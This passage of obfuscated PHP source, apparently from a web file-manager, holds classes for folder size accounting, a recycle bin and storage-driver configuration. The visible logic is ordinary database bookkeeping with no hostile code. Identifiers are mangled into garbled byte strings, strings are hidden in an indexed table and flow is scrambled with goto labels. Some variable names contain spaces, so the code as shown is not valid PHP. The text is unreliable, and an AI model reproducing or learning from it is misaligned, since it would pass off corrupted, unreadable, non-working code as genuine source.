array($dà‘‹×í¶¡[523] => 1, $dà‘‹×í¶¡[530] => array($dà‘‹×í¶¡[488], $c•ñÓÄËÚ¸[$dà‘‹×í¶¡[464]] . $AôáÆ‚àœ . $dà‘‹×í¶¡[489])); $eÚÏå¼¨í = $dà‘‹×í¶¡[2399]; $Eøìˆ•ç© = $this->field($eÚÏå¼¨í)->where($b§µ”Ë†°)->select(); goto B‹Ù’™£ó; fÈÇñÏï‘™: foreach ($fÚË»øµ“ as $Cƒ›¤‹ˆ†Û) { $C³¶Ô™®ôÁ = $Cƒ›¤‹ˆ†Û[$dà‘‹×í¶¡[466]] . $dà‘‹×í¶¡[33]; if (!isset($Eøìˆ•ç©[$C³¶Ô™®ôÁ])) { continue; } if ($Cƒ›¤‹ˆ†Û[$dà‘‹×í¶¡[401]] == $Eøìˆ•ç©[$C³¶Ô™®ôÁ][$dà‘‹×í¶¡[401]]) { $Eøìˆ•ç©[$C³¶Ô™®ôÁ][$dà‘‹×í¶¡[77]] += $Cƒ›¤‹ˆ†Û[$dà‘‹×í¶¡[77]]; } } foreach ($Eøìˆ•ç© as $Cƒ›¤‹ˆ†Û) { $bÕò™‘èó = $this->parentLevelArray($Cƒ›¤‹ˆ†Û[$dà‘‹×í¶¡[464]]); foreach ($bÕò™‘èó as $C³¶Ô™®ôÁ) { $C³¶Ô™®ôÁ = $C³¶Ô™®ôÁ . $dà‘‹×í¶¡[33]; if (!isset($Eøìˆ•ç©[$C³¶Ô™®ôÁ])) { continue; } if ($Cƒ›¤‹ˆ†Û[$dà‘‹×í¶¡[401]] == $Eøìˆ•ç©[$C³¶Ô™®ôÁ][$dà‘‹×í¶¡[401]]) { $Eøìˆ•ç©[$C³¶Ô™®ôÁ][$dà‘‹×í¶¡[77]] += $Cƒ›¤‹ˆ†Û[$dà‘‹×í¶¡[77]]; } } } $d½ÆÎ²½®á = array(); goto f—¨¿ƒ‡; aˆĞÉ³‘õ„: $dà‘‹×í¶¡ =& $_SERVER[…Ò×–]; $this->sourceCacheClear($AôáÆ‚àœ); $c•ñÓÄËÚ¸ = $this->sourceInfo($AôáÆ‚àœ); goto Dóëò”¦’; CíË„âŸ: $Eøìˆ•ç©[] = $c•ñÓÄËÚ¸; $Eøìˆ•ç© = array_to_keyvalue($Eøìˆ•ç©, $dà‘‹×í¶¡[373]); foreach ($Eøìˆ•ç© as $f„Š¸çì«† => $Cƒ›¤‹ˆ†Û) { $Eøìˆ•ç©[$f„Š¸çì«†][$dà‘‹×í¶¡[2400]] = $Eøìˆ•ç©[$f„Š¸çì«†][$dà‘‹×í¶¡[77]]; $Eøìˆ•ç©[$f„Š¸çì«†][$dà‘‹×í¶¡[77]] = 0; } goto fÈÇñÏï‘™; B‹Ù’™£ó: $b§µ”Ë†°[$dà‘‹×í¶¡[374]] = 0; $fÚË»øµ“ = $this->field($eÚÏå¼¨í)->where($b§µ”Ë†°)->select(); if (!$fÚË»øµ“) { return; } goto CíË„âŸ; fˆÀÍÍœ: } public function userSpaceReset($eÍƒˆ¶ÉŒ = false) { $E®œù…¢ò =& $_SERVER[…Ò×–]; $aÃ­¸ñæ¹ƒ = $this->where(array($E®œù…¢ò[375] => self::TYPE_USER, $E®œù…¢ò[461] => $eÍƒˆ¶ÉŒ, $E®œù…¢ò[374] => 0))->sum($E®œù…¢ò[77]); Model($E®œù…¢ò[479])->userEdit($eÍƒˆ¶ÉŒ, array($E®œù…¢ò[2105] => $aÃ­¸ñæ¹ƒ)); } public function targetSpaceUpdate($f”›ìößòù, $e¥º„Û«¯ò) { $a³ã…¬ŞË =& $_SERVER[…Ò×–]; if (!$e¥º„Û«¯ò) { return; } if (!in_array($f”›ìößòù, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $bÖÕï¯´“æ = $this->targetSpaceSize($f”›ìößòù, $e¥º„Û«¯ò); if ($f”›ìößòù == self::TYPE_USER) { Model($a³ã…¬ŞË[479])->userEdit($e¥º„Û«¯ò, array($a³ã…¬ŞË[2105] => $bÖÕï¯´“æ)); } else { if ($f”›ìößòù == self::TYPE_GROUP) { Model($a³ã…¬ŞË[463])->groupEdit($e¥º„Û«¯ò, array($a³ã…¬ŞË[2105] => $bÖÕï¯´“æ)); } } } public function targetSpaceSize($A‡ØÈ›É‰ø, $aÁ¹ÀÏÕÁù) { goto b¹“ÎÈšÀ; fŒìãì¿òŒ: $Ešê‡ÌÁ„ = floatval($D¡°’¦Ğ[$FèŠ‘ó¥ğ[77]]); $DÒ¦ƒ¥’ƒŒ = array($FèŠ‘ó¥ğ[530] => array($FèŠ‘ó¥ğ[488], $FèŠ‘ó¥ğ[475] . $D¡°’¦Ğ[$FèŠ‘ó¥ğ[373]] . $FèŠ‘ó¥ğ[489])); $f¿Ù¸‹ğÚ» = Model($FèŠ‘ó¥ğ[399])->field($FèŠ‘ó¥ğ[387])->where($DÒ¦ƒ¥’ƒŒ)->select(); goto B´êòÃƒèï; b£Ù‹†¥ˆÅ: return $Ešê‡ÌÁ„; goto C—­¤½Éœ¤; b¹“ÎÈšÀ: $FèŠ‘ó¥ğ =& $_SERVER[…Ò×–]; $D¡°’¦Ğ = $this->sourceRoot($A‡ØÈ›É‰ø, $aÁ¹ÀÏÕÁù, !0); if (!$D¡°’¦Ğ) { return 0; } goto fŒìãì¿òŒ; B´êòÃƒèï: $f¿Ù¸‹ğÚ» = array_to_keyvalue($f¿Ù¸‹ğÚ», $FèŠ‘ó¥ğ[33], $FèŠ‘ó¥ğ[373]); $f¿Ù¸‹ğÚ» = array_unique(array_filter($f¿Ù¸‹ğÚ»)); if ($f¿Ù¸‹ğÚ») { $DÒ¦ƒ¥’ƒŒ = array($FèŠ‘ó¥ğ[387] => array($FèŠ‘ó¥ğ[388], $f¿Ù¸‹ğÚ»)); $Ešê‡ÌÁ„ += floatval($this->where($DÒ¦ƒ¥’ƒŒ)->sum($FèŠ‘ó¥ğ[77])); } goto b£Ù‹†¥ˆÅ; C—­¤½Éœ¤: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($AæŞ¬ÏË…•) { return $this->fileTypeProfile($AæŞ¬ÏË…•, SourceModel::TYPE_USER); } public function groupFileTypeProfile($Eó²½µ ²À) { return $this->fileTypeProfile($Eó²½µ ²À, SourceModel::TYPE_GROUP); } private function fileTypeProfile($f«À‘Û¬‹ë, $CÛä‹‹Ü³) { goto DÔİÇ¯´; C£×Ô¯µåŒ: if ($cÂ‹Š±ó¼Î) { return $cÂ‹Š±ó¼Î; } $f§á¨‡Óã = array($d¾«¥¼„·¼[523] => 0); if ($f«À‘Û¬‹ë != !1) { $f§á¨‡Óã[$d¾«¥¼„·¼[461]] = $f«À‘Û¬‹ë; $f§á¨‡Óã[$d¾«¥¼„·¼[375]] = $CÛä‹‹Ü³; } goto eÓ‹ƒ»¤¢Ì; DÔİÇ¯´: $d¾«¥¼„·¼ =& $_SERVER[…Ò×–]; $D¦º´„±Ü  = $d¾«¥¼„·¼[2401] . $f«À‘Û¬‹ë . $d¾«¥¼„·¼[70] . $CÛä‹‹Ü³; $cÂ‹Š±ó¼Î = Cache::get($D¦º´„±Ü ); goto C£×Ô¯µåŒ; AçÃ¶èêˆ‘: foreach ($Eì®ìŞË © as $fËäàÀ³° => $dõŸÏ’‰Å¼) { $f§á¨‡Óã[$d¾«¥¼„·¼[376]] = $this->fileTypeWhere($fËäàÀ³°); $eäİ‚õë–[$fËäàÀ³°] = array($d¾«¥¼„·¼[2403] => $dõŸÏ’‰Å¼[$d¾«¥¼„·¼[28]], $d¾«¥¼„·¼[2404] => $this->where($f§á¨‡Óã)->count(), $d¾«¥¼„·¼[525] => $this->where($f§á¨‡Óã)->sum($d¾«¥¼„·¼[77])); } Cache::set($D¦º´„±Ü , $eäİ‚õë–, 1200); return $eäİ‚õë–; goto eÜÇÉ­ø†; eÓ‹ƒ»¤¢Ì: $eäİ‚õë– = array(); $eäİ‚õë–[$d¾«¥¼„·¼[2402]] = array($d¾«¥¼„·¼[2403] => LNG($d¾«¥¼„·¼[2402]), $d¾«¥¼„·¼[2404] => $this->where($f§á¨‡Óã)->count(), $d¾«¥¼„·¼[525] => $this->where($f§á¨‡Óã)->sum($d¾«¥¼„·¼[77])); $Eì®ìŞË © = KodIO::fileTypeList(); goto AçÃ¶èêˆ‘; eÜÇÉ­ø†: } public function fileNameExist($a‰ô±¦ñ¤, $Bë‘·…—) { $C¬óÉ’Í¥Î =& $_SERVER[…Ò×–]; $e¯ç·šµŒİ = $this->childList($a‰ô±¦ñ¤); foreach ($e¯ç·šµŒİ as $EÅ´Š‹Šá™) { if ($EÅ´Š‹Šá™[$C¬óÉ’Í¥Î[28]] == $Bë‘·…—) { return $EÅ´Š‹Šá™[$C¬óÉ’Í¥Î[373]]; } if (strtolower($EÅ´Š‹Šá™[$C¬óÉ’Í¥Î[28]]) == strtolower($Bë‘·…—)) { return $EÅ´Š‹Šá™[$C¬óÉ’Í¥Î[373]]; } } return !1; } public function childList($A”‹æ™ø†) { goto eéîÔœ¿óÍ; B›èî™Ü¥: self::$cacheChildList[$e”ÑøŸâÁÃ] = $CÃ§é¢ÍÈÆ; foreach ($CÃ§é¢ÍÈÆ as $DİˆŞšõ¨Ö) { $e”ÑøŸâÁÃ = $A¡êÇ¬¡Š¿[414] . $DİˆŞšõ¨Ö[$A¡êÇ¬¡Š¿[373]]; self::$cacheSourceInfo[$e”ÑøŸâÁÃ] = $DİˆŞšõ¨Ö; } return $CÃ§é¢ÍÈÆ; goto DÄ¿áÃèè®; Bõ²ùˆÀ§Ú: $B§ºßÏßÃ© = array($A¡êÇ¬¡Š¿[466] => intval($A”‹æ™ø†), $A¡êÇ¬¡Š¿[401] => 0); $CÃ§é¢ÍÈÆ = $this->where($B§ºßÏßÃ©)->select(); $CÃ§é¢ÍÈÆ = $CÃ§é¢ÍÈÆ ? $CÃ§é¢ÍÈÆ : array(); goto B›èî™Ü¥; eéîÔœ¿óÍ: $A¡êÇ¬¡Š¿ =& $_SERVER[…Ò×–]; $e”ÑøŸâÁÃ = $A¡êÇ¬¡Š¿[2383] . $A”‹æ™ø†; if (isset(self::$cacheChildList[$e”ÑøŸâÁÃ])) { return self::$cacheChildList[$e”ÑøŸâÁÃ]; } goto Bõ²ùˆÀ§Ú; DÄ¿áÃèè®: } public function fileNameAuto($Fß’ÌÊ²›, $cœ¬²‹ˆÅ, $f ¾³ÈŞ† = REPEAT_RENAME, $Dõ™·ƒÓ®… = false) { $D §é¦— =& $_SERVER[…Ò×–]; $a§†Œ×øïé = $this->childList($Fß’ÌÊ²›); $Dƒ®ó™ÌÎŞ = array_to_keyvalue($a§†Œ×øïé, $D §é¦—[33], $D §é¦—[28]); return $this->fileNameAutoGet($Dƒ®ó™ÌÎŞ, $cœ¬²‹ˆÅ, $f ¾³ÈŞ†, $Dõ™·ƒÓ®…); } public function fileNameAutoGet($CŠÁ‚˜ˆİ, $b©ÖØò÷õÛ, $d«ªó£ ßŠ, $bãé©Ö„) { $aŒ×ßŞ»Ç =& $_SERVER[…Ò×–]; if ($d«ªó£ ßŠ == REPEAT_REPLACE || !$CŠÁ‚˜ˆİ || !in_array_not_case($b©ÖØò÷õÛ, $CŠÁ‚˜ˆİ) || $bãé©Ö„ && $d«ªó£ ßŠ != REPEAT_RENAME_FOLDER) { return $b©ÖØò÷õÛ; } if ($d«ªó£ ßŠ == REPEAT_SKIP) { return !1; } $f¯ÕôÙ‹—Û = $aŒ×ßŞ»Ç[91] . get_path_ext($b©ÖØò÷õÛ); $f¯ÕôÙ‹—Û = $f¯ÕôÙ‹—Û == $aŒ×ßŞ»Ç[91] || $bãé©Ö„ ? $aŒ×ßŞ»Ç[33] : $f¯ÕôÙ‹—Û; for ($BìÚÑŸ†ñ = 1; $BìÚÑŸ†ñ <= count($CŠÁ‚˜ˆİ) + 1; $BìÚÑŸ†ñ++) { $Aœ˜Ÿ‚ØÖë = substr($b©ÖØò÷õÛ, 0, strlen($b©ÖØò÷õÛ) - strlen($f¯ÕôÙ‹—Û)); $Aä›âè§‘ = $Aœ˜Ÿ‚ØÖë . "\50{$BìÚÑŸ†ñ}\x29{$f¯ÕôÙ‹—Û}"; if (!in_array_not_case($Aä›âè§‘, $CŠÁ‚˜ˆİ)) { return $Aä›âè§‘; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\x6f\x75\x72\143\145\137\162\145\143\x79\143\154\x65"; protected $dataAuto = array(array("\143\x72\x65\x61\164\x65\124\x69\x6d\x65", "\164\x69\155\145", "\151\156\x73\x65\x72\x74", "\x66\x75\156\143\164\151\157\156")); public function listData($a£âöã„†š = false) { $aÇ šŠ¢» =& $_SERVER[…Ò×–]; $a£âöã„†š = $a£âöã„†š ? $a£âöã„†š : USER_ID; $CÛ”ğÜïÚ‰ = $this->where(array($aÇ šŠ¢»[1441] => $a£âöã„†š))->select(); return array_to_keyvalue($CÛ”ğÜïÚ‰, $aÇ šŠ¢»[33], $aÇ šŠ¢»[373]); } public function moveToRecycle($aì©­±) { goto AÍ…îåí†©; AÍ…îåí†©: $e‘æéî¢– =& $_SERVER[…Ò×–]; $Dø¯—…ôŠ† = Model($e‘æéî¢–[1127]); $d¯èÍ­‡¤ = $Dø¯—…ôŠ†->sourceInfo($aì©­±); goto dù”…°“Ÿ£; dù”…°“Ÿ£: if (!$d¯èÍ­‡¤ || $d¯èÍ­‡¤[$e‘æéî¢–[401]] == $e‘æéî¢–[83]) { return; } $Fì÷íÁ…¹Ã = array($e‘æéî¢–[387] => $aì©­±, $e‘æéî¢–[1441] => USER_ID, $e‘æéî¢–[526] => $d¯èÍ­‡¤[$e‘æéî¢–[375]], $e‘æéî¢–[527] => $d¯èÍ­‡¤[$e‘æéî¢–[461]], $e‘æéî¢–[530] => $d¯èÍ­‡¤[$e‘æéî¢–[464]]); $this->add($Fì÷íÁ…¹Ã); goto bœßº—»Ú; bœßº—»Ú: $this->recycleMove($aì©­±, 1); if ($d¯èÍ­‡¤[$e‘æéî¢–[374]] == $e‘æéî¢–[83]) { $C‹®¡ìÛĞ» = array($e‘æéî¢–[530] => array($e‘æéî¢–[488], $d¯èÍ­‡¤[$e‘æéî¢–[464]] . $aì©­± . $e‘æéî¢–[489])); $Dø¯—…ôŠ†->where($C‹®¡ìÛĞ»)->setField($e‘æéî¢–[401], 1); } goto BšĞ­ù‡ç; BšĞ­ù‡ç: } public function clear() { $this->remove(!1); } public function remove($D²¤ÄÉÔôô = false) { goto d·ÄÃ°â¾ë; b¡ÀÏ…—±à: $D²¤ÄÉÔôô = $D²¤ÄÉÔôô === !1 ? !1 : $D²¤ÄÉÔôô; $D™™«Ÿ½ã = array(); foreach ($aĞ”©…ŠÊ’ as $e•½´ìÍÀ‘) { if ($D²¤ÄÉÔôô != !1 && !in_array($e•½´ìÍÀ‘, $D²¤ÄÉÔôô)) { continue; } $F‹ô¹‚©Œ = $e…óİ¿…˜->sourceInfo($e•½´ìÍÀ‘); $e…óİ¿…˜->remove($e•½´ìÍÀ‘, !1); $Fë´Ò£ğ = $F‹ô¹‚©Œ[$eÇÚÈ‡÷©ö[375]] . $eÇÚÈ‡÷©ö[70] . $F‹ô¹‚©Œ[$eÇÚÈ‡÷©ö[461]]; $D™™«Ÿ½ã[$Fë´Ò£ğ] = array($eÇÚÈ‡÷©ö[526] => $F‹ô¹‚©Œ[$eÇÚÈ‡÷©ö[375]], $eÇÚÈ‡÷©ö[461] => $F‹ô¹‚©Œ[$eÇÚÈ‡÷©ö[461]]); $this->where(array($eÇÚÈ‡÷©ö[373] => $e•½´ìÍÀ‘))->delete(); } goto Cæ¦¡ßÖçÄ; d·ÄÃ°â¾ë: $eÇÚÈ‡÷©ö =& $_SERVER[…Ò×–]; $e…óİ¿…˜ = Model($eÇÚÈ‡÷©ö[1127]); $aĞ”©…ŠÊ’ = $this->listData(); goto b¡ÀÏ…—±à; Cæ¦¡ßÖçÄ: foreach ($D™™«Ÿ½ã as $f”Ö÷²¢æ®) { $e…óİ¿…˜->targetSpaceUpdate($f”Ö÷²¢æ®[$eÇÚÈ‡÷©ö[375]], $f”Ö÷²¢æ®[$eÇÚÈ‡÷©ö[461]]); } goto F±ß¢õ· ; F±ß¢õ· : } public function restore($d‚©‹ÖÆ÷º = false) { goto f¾çÄŠÎ¹è; EßÁ”èÌ•: foreach ($E…¥¡òâóµ as $A½£«‹ß) { goto d°ö‚¬ŒÛ; fã×’à©¥¸: if ($FÔÎ¡–‚³[$C£ôæÔ¢®‚[401]] == $C£ôæÔ¢®‚[83]) { continue; } $fÒˆÈ è£Ş->lockMoveStart($A½£«‹ß); $this->recycleMove($A½£«‹ß, 0); goto f¶÷˜Ó¸ºÇ; f¶÷˜Ó¸ºÇ: if ($Aº®¸±§õŠ[$C£ôæÔ¢®‚[374]] == $C£ôæÔ¢®‚[83]) { $a•éîÊçî™ = array($C£ôæÔ¢®‚[530] => array($C£ôæÔ¢®‚[488], $Aº®¸±§õŠ[$C£ôæÔ¢®‚[464]] . $A½£«‹ß . $C£ôæÔ¢®‚[489])); $fÒˆÈ è£Ş->where($a•éîÊçî™)->setField($C£ôæÔ¢®‚[401], 0); $this->restoreFolderChildren($A½£«‹ß, $E…¥¡òâóµ); } $this->where(array($C£ôæÔ¢®‚[373] => $A½£«‹ß))->delete(); $fÒˆÈ è£Ş->folderSizeReset($Aº®¸±§õŠ[$C£ôæÔ¢®‚[466]]); goto C ¤·•ğâ—; C ¤·•ğâ—: $F»®í˜É[] = $Aº®¸±§õŠ[$C£ôæÔ¢®‚[466]]; if ($Aº®¸±§õŠ[$C£ôæÔ¢®‚[374]] == $C£ôæÔ¢®‚[83]) { $F»®í˜É[] = $A½£«‹ß; } $fÒˆÈ è£Ş->lockMoveEnd($A½£«‹ß); goto aÌíÉ’áÃâ; d°ö‚¬ŒÛ: if ($d‚©‹ÖÆ÷º != !1 && !in_array($A½£«‹ß, $d‚©‹ÖÆ÷º)) { continue; } $Aº®¸±§õŠ = $fÒˆÈ è£Ş->sourceInfo($A½£«‹ß); $FÔÎ¡–‚³ = $fÒˆÈ è£Ş->sourceInfo($Aº®¸±§õŠ[$C£ôæÔ¢®‚[466]]); goto fã×’à©¥¸; aÌíÉ’áÃâ: } $fÒˆÈ è£Ş->updateModifyTime($F»®í˜É); goto aô˜±ª¾‹; Bëîâ¨‘Ã: $d‚©‹ÖÆ÷º = $d‚©‹ÖÆ÷º == !1 ? !1 : $d‚©‹ÖÆ÷º; if (!$E…¥¡òâóµ) { return !0; } $F»®í˜É = array(); goto EßÁ”èÌ•; f¾çÄŠÎ¹è: $C£ôæÔ¢®‚ =& $_SERVER[…Ò×–]; $fÒˆÈ è£Ş = Model($C£ôæÔ¢®‚[1127]); $E…¥¡òâóµ = $this->listData(); goto Bëîâ¨‘Ã; aô˜±ª¾‹: } private function restoreFolderChildren($cïŸëğì, $FÌ‘Å Œ¦¤) { goto Díä“óöõ; EÀƒÀ°ªÎò: foreach ($FÌ‘Å Œ¦¤ as $B‡áÀ°é«¯) { if ($B‡áÀ°é«¯ == $cïŸëğì) { continue; } if (!$d®®Öİğ¼È->isParentOf($cïŸëğì, $B‡áÀ°é«¯)) { continue; } $A…ÍæµÀùù = $d®®Öİğ¼È->sourceInfo($B‡áÀ°é«¯); if ($A…ÍæµÀùù[$F×Â‚Ûãê[374]] == $F×Â‚Ûãê[83]) { $AªÈÊï’³°[] = array($F×Â‚Ûãê[530] => array($F×Â‚Ûãê[488], $A…ÍæµÀùù[$F×Â‚Ûãê[464]] . $B‡áÀ°é«¯ . $F×Â‚Ûãê[489])); } else { $AªÈÊï’³°[$F×Â‚Ûãê[373]][1][] = $B‡áÀ°é«¯; } } if (!$AªÈÊï’³°[$F×Â‚Ûãê[373]][1]) { unset($AªÈÊï’³°[$F×Â‚Ûãê[373]]); } if (!$AªÈÊï’³°) { return; } goto dÁøäÎƒ¼»; dÁøäÎƒ¼»: $AªÈÊï’³°[$F×Â‚Ûãê[373]][1] = array_unique($AªÈÊï’³°[$F×Â‚Ûãê[373]][1]); $AªÈÊï’³°[$F×Â‚Ûãê[920]] = $F×Â‚Ûãê[2204]; $d®®Öİğ¼È->where($AªÈÊï’³°)->setField($F×Â‚Ûãê[401], 1); goto d£İÅ¨ÉÏ…; Díä“óöõ: $F×Â‚Ûãê =& $_SERVER[…Ò×–]; $d®®Öİğ¼È = Model($F×Â‚Ûãê[1127]); $AªÈÊï’³° = array($F×Â‚Ûãê[373] => array($F×Â‚Ûãê[7], array())); goto EÀƒÀ°ªÎò; d£İÅ¨ÉÏ…: } private function recycleMove($cå¡¿ÄŞ¯½, $D‚†İ¬¹³Ú = 1) { $dÜŸİ £Ä¼ =& $_SERVER[…Ò×–]; $båïåâ×Ÿ² = Model($dÜŸİ £Ä¼[1127]); $cÆÛ¿»ô Ç = Model($dÜŸİ £Ä¼[2405]); $F×åİÔÜ = array($dÜŸİ £Ä¼[373] => $cå¡¿ÄŞ¯½); if ($D‚†İ¬¹³Ú) { $båïåâ×Ÿ²->where($F×åİÔÜ)->setField($dÜŸİ £Ä¼[401], 1); $cÆÛ¿»ô Ç->eventRecycle($cå¡¿ÄŞ¯½, $dÜŸİ £Ä¼[2406]); } else { $fÊëĞ™å‹Õ = $båïåâ×Ÿ²->where($F×åİÔÜ)->find(); $C¼²«’›Ü• = $fÊëĞ™å‹Õ[$dÜŸİ £Ä¼[374]] == $dÜŸİ £Ä¼[83]; $fì¥‡ÒÈ = $båïåâ×Ÿ²->fileNameAuto($fÊëĞ™å‹Õ[$dÜŸİ £Ä¼[466]], $fÊëĞ™å‹Õ[$dÜŸİ £Ä¼[28]], REPEAT_RENAME_FOLDER, $C¼²«’›Ü•); if ($fì¥‡ÒÈ != $fÊëĞ™å‹Õ[$dÜŸİ £Ä¼[28]]) { $båïåâ×Ÿ²->rename($cå¡¿ÄŞ¯½, $fì¥‡ÒÈ); } $båïåâ×Ÿ²->where($F×åİÔÜ)->setField($dÜŸİ £Ä¼[401], 0); $cÆÛ¿»ô Ç->eventRecycle($cå¡¿ÄŞ¯½, $dÜŸİ £Ä¼[2407]); } } } class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\x6d\x2e\x73\x74\x6f\x72\x61\x67\145\114\x69\x73\x74"; public $field = array("\156\141\x6d\145", "\x73\x69\x7a\x65\x4d\x61\170", "\x73\x79\x73\x74\x65\x6d", "\x64\x65\x66\x61\x75\x6c\x74", "\x64\x72\151\x76\x65\162", "\143\x6f\x6e\x66\151\x67"); public function listData($c„á·¾íøã = false, $DÙ­„Ëå³ó = "\x6d\x6f\x64\x69\146\171\x54\x69\155\145", $c×Î¨ãÊ = false) { goto C–ó…±×‘Ë; C–ó…±×‘Ë: $BŒ±‰´Ö†À =& $_SERVER[…Ò×–]; $fÛ¨«Û­Æé = parent::listData($c„á·¾íøã, $DÙ­„Ëå³ó, $c×Î¨ãÊ); if ($c„á·¾íøã) { return $fÛ¨«Û­Æé; } goto D¢„ªÚ®Œ»; D¢„ªÚ®Œ»: foreach ($fÛ¨«Û­Æé as $b ¤¨Ø‚Ë => $DôÆ”¼äŠŸ) { unset($fÛ¨«Û­Æé[$b ¤¨Ø‚Ë][$BŒ±‰´Ö†À[6]]); $fÛ¨«Û­Æé[$b ¤¨Ø‚Ë][$BŒ±‰´Ö†À[2105]] = 0; } $aêĞŞ­¶Û = array_to_keyvalue($fÛ¨«Û­Æé, $BŒ±‰´Ö†À[33], $BŒ±‰´Ö†À[371]); $this->_listAppendSize($fÛ¨«Û­Æé, $aêĞŞ­¶Û); goto fÖòÌ©±Ø; fÖòÌ©±Ø: return $fÛ¨«Û­Æé; goto cëªäê…Í; cëªäê…Í: } public function _listAppendSize(&$CêÁ¿Ì½¬Ô, $E—•œÇƒÓ) { $C…ëìõš¢ê =& $_SERVER[…Ò×–]; if (!$E—•œÇƒÓ) { return; } $D‹‚•°é—¥ = $C…ëìõš¢ê[2408] . implode($C…ëìõš¢ê[47], $E—•œÇƒÓ) . $C…ëìõš¢ê[2409]; $fÙ÷µãÒÖ² = Model($C…ëìõš¢ê[723])->query($D‹‚•°é—¥); $fÙ÷µãÒÖ² = array_to_keyvalue($fÙ÷µãÒÖ², $C…ëìõš¢ê[371], $C…ëìõš¢ê[77]); foreach ($CêÁ¿Ì½¬Ô as $CŠæµç’ã¶ => $EÍß‰Ç¨ÎÏ) { $CêÁ¿Ì½¬Ô[$CŠæµç’ã¶][$C…ëìõš¢ê[2105]] = isset($fÙ÷µãÒÖ²[$EÍß‰Ç¨ÎÏ[$C…ëìõš¢ê[371]]]) ? $fÙ÷µãÒÖ²[$EÍß‰Ç¨ÎÏ[$C…ëìõš¢ê[371]]] : 0; } } public function getConfig($f„ÏØ•äÔ¬) { $AíÁÌ»ñõç = parent::listData($f„ÏØ•äÔ¬); return json_decode($AíÁÌ»ñõç[$_SERVER[…Ò×–][6]], !0); } public function update($d’¤³Ü¾áŠ, $D±¿Ÿ·˜îÉ) { goto B†¤Öñ¬’‚; eæ™¼‘•„‘: if (isset($dªğ•Àç„[$f×Áè¢Ú¦]) && $dªğ•Àç„[$f×Áè¢Ú¦][$aôÑáî‚ˆ[371]] != $d’¤³Ü¾áŠ) { return !1; } if (isset($D±¿Ÿ·˜îÉ[$aôÑáî‚ˆ[2410]]) && $D±¿Ÿ·˜îÉ[$aôÑáî‚ˆ[2410]] == $aôÑáî‚ˆ[83]) { $this->checkConfig($D±¿Ÿ·˜îÉ); } unset($D±¿Ÿ·˜îÉ[$aôÑáî‚ˆ[2410]]); goto CùÁª”ÑĞå; CùÁª”ÑĞå: $Eî’Ææ¤ = parent::update($d’¤³Ü¾áŠ, $D±¿Ÿ·˜îÉ); if ($Eî’Ææ¤ && $D±¿Ÿ·˜îÉ[$aôÑáî‚ˆ[34]]) { foreach ($dªğ•Àç„ as $DïÛ‚òÑ¢Ü) { if ($DïÛ‚òÑ¢Ü[$aôÑáî‚ˆ[34]] && $DïÛ‚òÑ¢Ü[$aôÑáî‚ˆ[371]] != $d’¤³Ü¾áŠ) { parent::update($DïÛ‚òÑ¢Ü[$aôÑáî‚ˆ[371]], array($aôÑáî‚ˆ[34] => 0)); } } } return $Eî’Ææ¤; goto eØ»º”¯¼ê; B†¤Öñ¬’‚: $aôÑáî‚ˆ =& $_SERVER[…Ò×–]; $f×Áè¢Ú¦ = $D±¿Ÿ·˜îÉ[$aôÑáî‚ˆ[28]]; $dªğ•Àç„ = array_to_keyvalue(parent::listData(), $aôÑáî‚ˆ[28]); goto eæ™¼‘•„‘; eØ»º”¯¼ê: } public function add($D¨ç÷£œ«) { goto eßéš‹›•ë; Fàèğ®¬»: return $E¾µßÜÈ•š; goto F²¹É™Îœ; eßéš‹›•ë: $CÜŞ™±…¶Ä =& $_SERVER[…Ò×–]; $f‚“ƒİäï = array_to_keyvalue(parent::listData(), $CÜŞ™±…¶Ä[28]); if (isset($f‚“ƒİäï[$D¨ç÷£œ«[$CÜŞ™±…¶Ä[28]]])) { return !1; } goto FšÜ¾Ù×ƒ; FšÜ¾Ù×ƒ: $this->checkConfig($D¨ç÷£œ«); $E¾µßÜÈ•š = parent::insert($D¨ç÷£œ«); if ($E¾µßÜÈ•š && $D¨ç÷£œ«[$CÜŞ™±…¶Ä[34]]) { foreach ($f‚“ƒİäï as $CÅ‰ŠÇŞÖ) { if ($CÅ‰ŠÇŞÖ[$CÜŞ™±…¶Ä[34]]) { parent::update($CÅ‰ŠÇŞÖ[$CÜŞ™±…¶Ä[371]], array($CÜŞ™±…¶Ä[34] => 0)); } } } goto Fàèğ®¬»; F²¹É™Îœ: } public function checkConfig(&$a”äÕ±òë) { goto câÍğ‰…èŸ; D‰·ã·å¸: $cÔ†¦ñÄá¯ = new $DêŞäË‘àÂ($cœ¼Ï·ã³Œ); if (in_array($a‚Ï«œ×ÚÛ, $cÔ†¦ñÄá¯->objectDriver)) { if (!$cÔ†¦ñÄá¯->isBucketCors() && !$cÔ†¦ñÄá¯->setBucketCors()) { $f¬œÛîèö³ = LNG($eŞèÜ ˆòŠ[2415]); $f¬œÛîèö³ .= $eŞèÜ ˆòŠ[2416] . LNG($eŞèÜ ˆòŠ[2417]); show_json($f¬œÛîèö³, !1); } } $A®¬¾Ÿø…¼ = rtrim($cœ¼Ï·ã³Œ[$eŞèÜ ˆòŠ[1035]], $eŞèÜ ˆòŠ[8]) . $eŞèÜ ˆòŠ[8]; goto D§ª«êäŠ³; BÄŠ£ø‰¡Ó: $a”äÕ±òë[$eŞèÜ ˆòŠ[6]] = json_encode($cœ¼Ï·ã³Œ); $a”äÕ±òë[$eŞèÜ ˆòŠ[90]] = $AÁŒÕ¦£ÏÖ; return !0; goto f°ŒÆ‘ôÀ; D§ª«êäŠ³: $b©­¬ƒôÛË = $cÔ†¦ñÄá¯->getPath($A®¬¾Ÿø…¼ . $eŞèÜ ˆòŠ[2000]); if (!$cÔ†¦ñÄá¯->mkfile($b©­¬ƒôÛË)) { show_json(LNG($eŞèÜ ˆòŠ[2415]), !1); } $cœ¼Ï·ã³Œ[$eŞèÜ ˆòŠ[1035]] = $A®¬¾Ÿø…¼; goto BÄŠ£ø‰¡Ó; d¢™¤å×†: $AÁŒÕ¦£ÏÖ = isset($Bó“¬£õåÙ[$a‚Ï«œ×ÚÛ]) ? $Bó“¬£õåÙ[$a‚Ï«œ×ÚÛ] : ucfirst($a‚Ï«œ×ÚÛ); $DêŞäË‘àÂ = $eŞèÜ ˆòŠ[71] . $AÁŒÕ¦£ÏÖ; if (!$AÁŒÕ¦£ÏÖ || !class_exists($DêŞäË‘àÂ)) { write_log(array($eŞèÜ ˆòŠ[2412], $a”äÕ±òë, get_caller_info()), $eŞèÜ 